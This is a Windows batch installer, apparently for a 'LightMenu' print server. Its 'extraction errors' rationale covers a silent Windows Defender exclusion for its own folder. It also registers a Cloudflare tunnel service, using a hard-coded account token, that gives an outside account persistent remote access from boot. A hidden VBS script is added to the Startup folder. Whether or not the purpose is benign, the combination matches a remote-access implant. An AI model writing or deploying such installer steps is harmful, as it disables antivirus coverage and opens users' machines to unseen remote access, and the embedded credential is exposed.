@echo off
title LightMenu Install
echo ================================
echo  LightMenu Print Server Setup
echo ================================
echo.

REM Check if running as admin
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Please run as Administrator
    pause
    exit /b 1
)

REM Add Windows Defender exclusion for this folder (prevents extraction errors)
echo Adding antivirus exclusion...
powershell -Command "Add-MpPreference -ExclusionPath '%~dp0'" >nul 2>&1

REM Install cloudflared if not present
where cloudflared >nul 2>&1
if %errorLevel% neq 0 (
    echo Installing Cloudflare Tunnel...
    winget install Cloudflare.cloudflared
)

REM Install the tunnel as a Windows service (auto-starts on boot)
echo Installing tunnel service...
cloudflared service install eyJhIjoiNGZmYjBlMzc1ODk0ODcwODE0NGE0ZGVmODNmNTllMGMiLCJzIjoiN2xDSUJRY3J5dUZMTC9paERsWmJZL3dWM0JEQ2QxdGJERS8vTk5RU3IzQT0iLCJ0IjoiYzI1MTQ3MjctMmQ5OS00ZjEzLTg1YzctZGY3M2E3ZjAwNjI5In0=

REM Create startup shortcut for print server
echo Creating startup entry...
set STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
copy "%~dp0start-silent.vbs" "%STARTUP%\LightMenu-Print.vbs" >nul

echo.
echo ================================
echo  Installation Complete!
echo  Print server will start
echo  automatically on Windows boot.
echo ================================
echo.
pause
